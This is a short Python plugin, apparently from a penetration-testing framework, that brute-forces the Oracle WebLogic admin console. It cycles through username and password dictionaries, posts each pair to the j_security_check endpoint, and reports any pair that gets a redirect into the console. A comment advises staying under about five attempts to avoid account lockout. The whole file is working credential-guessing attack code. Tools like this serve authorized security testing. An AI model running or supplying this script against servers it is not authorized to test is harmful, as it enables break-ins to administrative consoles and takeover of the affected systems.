#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.core.env import *
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEBLOGIC

    def load_dict(self):
        username_txt_path = self.parameter.get("U", None)
        if username_txt_path:
            self.username_list = self.read_file(username_txt_path)
        else:
            self.username_list = self.get_default_dict("weblogic_usernames.txt")

        password_txt_path = self.parameter.get("P", None)
        if password_txt_path:
            self.password_list = self.read_file(password_txt_path)
        else:
            self.password_list = self.get_default_dict("weblogic_passwords.txt")

    async def prove(self):
        if self.base_url:
            headers = {
                'Content-Type':  'application/x-www-form-urlencoded'
            }

            url = self.base_url + 'console/j_security_check'
            async with ClientSession() as session:
                async for (username, password) in self.generate_auth_dict(self.username_list, self.password_list): #    登陆失败错误过多会锁账户，不建议尝试爆破过多,5次以下差不多
                    data = 'j_username={}&j_password={}&j_character_encoding=UTF-8'.format(username, password)
                    async with session.post(url=url, data=data, headers=headers, allow_redirects=False) as res:
                        if res != None and res.status == 302:
                            location = res.headers.get('Location', '')
                            if '/console' in location and '/login/LoginForm.jsp' not in location and '/console/j_security_check' not in location:
                            # if ('Home Page' in text or 'WebLogic Server Console' in text and 'console.portal' in text):
                                yield username + "/" + password
                                return